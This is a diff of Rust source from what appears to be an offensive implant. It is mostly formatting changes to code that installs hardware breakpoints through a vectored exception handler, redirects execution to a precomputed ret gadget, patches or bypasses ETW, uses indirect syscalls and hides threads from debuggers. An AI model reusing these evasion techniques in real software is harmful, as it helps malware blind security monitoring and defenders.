@@ -28,12 +28,16 @@ static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
 static RET_GADGET: AtomicUsize = AtomicUsize::new(0);
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-unsafe fn context_ip(context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT) -> usize {
+unsafe fn context_ip(
+    context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT,
+) -> usize {
     (*context).Rip as usize
 }
 
 #[cfg(all(windows, target_arch = "aarch64"))]
-unsafe fn context_ip(context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT) -> usize {
+unsafe fn context_ip(
+    context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT,
+) -> usize {
     (*context).Pc as usize
 }
 
@@ -51,7 +55,7 @@ unsafe fn context_set_return_success_and_redirect(
     context: *mut windows_sys::Win32::System::Diagnostics::Debug::CONTEXT,
     gadget: usize,
 ) {
-    (*context).Anonymous.s_mut().X0 = 0;
+    (*context).Anonymous.Anonymous.X0 = 0;
     (*context).Pc = gadget as u64;
 }
 
@@ -189,9 +193,9 @@ unsafe extern "system" fn veh_handler(
 
 #[cfg(windows)]
 pub unsafe fn setup_hardware_breakpoints() {
-    use crate::win_types::INVALID_HANDLE_VALUE;
     use crate::win_types::CONTEXT;
     use crate::win_types::CONTEXT_DEBUG_REGISTERS;
+    use crate::win_types::INVALID_HANDLE_VALUE;
     /// Minimal thread access for hardware breakpoints: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
     const THREAD_BP_ACCESS: u64 = 0x1A02;
 
@@ -202,7 +206,11 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     type AddVehFn = unsafe extern "system" fn(
         u32,
-        Option<unsafe extern "system" fn(*mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS) -> i32>,
+        Option<
+            unsafe extern "system" fn(
+                *mut windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_POINTERS,
+            ) -> i32,
+        >,
     ) -> *mut std::ffi::c_void;
 
     let add_veh: Option<AddVehFn> = (|| unsafe {
@@ -296,10 +304,13 @@ pub unsafe fn setup_hardware_breakpoints() {
         // needs to scan memory or call NtQueryVirtualMemory at exception time.
         // NtQueryVirtualMemory is safe here (not inside a VEH handler).
         'gadget: {
-            use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
-            use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
-            use windows_sys::Win32::System::Memory::{MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY};
             use crate::win_types::PAGE_EXECUTE_READWRITE;
+            use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+            use windows_sys::Win32::System::Memory::{
+                MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_EXECUTE, PAGE_EXECUTE_READ,
+                PAGE_EXECUTE_WRITECOPY,
+            };
+            use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 
             /// Bitmask covering all protection flags that grant execute permission.
             const ANY_EXECUTE: u32 =
@@ -442,7 +453,10 @@ pub unsafe fn setup_hardware_breakpoints() {
                                 continue;
                             }
                             RET_GADGET.store(addr, Ordering::Release);
-                            tracing::debug!("evasion: ARM64 ret gadget pre-computed at {:#x}", addr);
+                            tracing::debug!(
+                                "evasion: ARM64 ret gadget pre-computed at {:#x}",
+                                addr
+                            );
                             break 'gadget;
                         }
                     }
@@ -497,7 +511,9 @@ pub unsafe fn setup_hardware_breakpoints() {
     if nt_set_context_thread.is_some() {
         tracing::debug!("evasion: using NtSetContextThread for debug register modification");
     } else {
-        tracing::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
+        tracing::debug!(
+            "evasion: NtSetContextThread not available, falling back to SetThreadContext"
+        );
         tracing::warn!(
             "evasion: SetThreadContext fallback path in use for debug register modification"
         );
@@ -539,16 +555,18 @@ pub unsafe fn setup_hardware_breakpoints() {
     // TH32CS_SNAPTHREAD = 0x00000004
     let snapshot = create_snapshot.map_or(INVALID_HANDLE_VALUE, |f| f(0x00000004, 0));
     if snapshot != INVALID_HANDLE_VALUE {
-        let mut te32: windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32 = std::mem::zeroed();
-        te32.dwSize = std::mem::size_of::<windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32>() as u32;
+        let mut te32: windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32 =
+            std::mem::zeroed();
+        te32.dwSize = std::mem::size_of::<
+            windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
+        >() as u32;
 
         if thread32_first.map_or(0, |f| f(snapshot, &mut te32)) != 0 {
             loop {
                 if te32.th32OwnerProcessID == pid {
                     // OpenThread → NtOpenThread (indirect syscall)
                     let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                    oa.Length =
-                        std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+                    oa.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
                     let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
                     let mut h_thread: usize = 0;
                     let open_ok = crate::syscall!(
@@ -811,10 +829,8 @@ pub unsafe fn setup_etw_patch(
     use common::config::EtwPatchMethod;
     let mode = mode.cloned().unwrap_or_default();
     match method.unwrap_or(&EtwPatchMethod::Direct) {
-        EtwPatchMethod::Direct => {
-            crate::etw_patch::patch_etw_with_mode(mode)
-                .map_err(|e| anyhow::anyhow!("direct ETW patch failed: {}", e))
-        }
+        EtwPatchMethod::Direct => crate::etw_patch::patch_etw_with_mode(mode)
+            .map_err(|e| anyhow::anyhow!("direct ETW patch failed: {}", e)),
         EtwPatchMethod::Hwbp => {
             #[cfg(windows)]
             {
@@ -822,7 +838,9 @@ pub unsafe fn setup_etw_patch(
             }
             #[cfg(not(windows))]
             {
-                Err(anyhow::anyhow!("Hwbp ETW bypass not available on non-Windows"))
+                Err(anyhow::anyhow!(
+                    "Hwbp ETW bypass not available on non-Windows"
+                ))
             }
         }
         EtwPatchMethod::HwBpHook => {
@@ -835,16 +853,26 @@ pub unsafe fn setup_etw_patch(
                     tracing::debug!("etw_patch: hw-bp-hook ETW bypass installed");
                     Ok(())
                 } else {
-                    tracing::warn!("etw_patch: hw-bp-hook ETW bypass failed; falling back to direct patch");
-                    crate::etw_patch::patch_etw_with_mode(mode)
-                        .map_err(|e| anyhow::anyhow!("hw-bp-hook failed and direct patch fallback also failed: {}", e))
+                    tracing::warn!(
+                        "etw_patch: hw-bp-hook ETW bypass failed; falling back to direct patch"
+                    );
+                    crate::etw_patch::patch_etw_with_mode(mode).map_err(|e| {
+                        anyhow::anyhow!(
+                            "hw-bp-hook failed and direct patch fallback also failed: {}",
+                            e
+                        )
+                    })
                 }
             }
             #[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
             {
                 tracing::warn!("etw_patch: HwBpHook method requested but hw-bp-hook feature not compiled; falling back to direct patch");
-                crate::etw_patch::patch_etw_with_mode(mode)
-                    .map_err(|e| anyhow::anyhow!("hw-bp-hook feature not compiled and direct patch fallback failed: {}", e))
+                crate::etw_patch::patch_etw_with_mode(mode).map_err(|e| {
+                    anyhow::anyhow!(
+                        "hw-bp-hook feature not compiled and direct patch fallback failed: {}",
+                        e
+                    )
+                })
             }
         }
     }
@@ -870,7 +898,7 @@ pub fn hide_current_thread() {
                 ) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
                     -2isize as crate::win_types::HANDLE, // GetCurrentThread()
-                    0x11,                                 // ThreadHideFromDebugger
+                    0x11,                                // ThreadHideFromDebugger
                     std::ptr::null_mut(),
                     0,
                 );
